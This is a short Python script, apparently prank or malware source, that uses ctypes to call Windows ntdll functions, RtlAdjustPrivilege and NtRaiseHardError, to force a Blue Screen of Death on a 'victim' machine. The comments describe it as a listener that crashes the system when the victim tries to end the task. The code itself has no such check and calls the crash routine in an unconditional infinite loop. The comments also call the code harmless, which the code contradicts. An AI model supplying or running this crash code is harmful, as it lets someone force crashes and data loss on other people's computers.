#this code will add a listener that makes sure the victim(even though this code is harmless) does not attempt to end the tast.
#if this happens, the code will launch a barrage of errors that will result in a BSOD
#this will likely be created into a seperate, larger project

import ctypes

def bsod():
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")


while True:
  #if window main closed(possible restart):
    #run error code
    bsod()
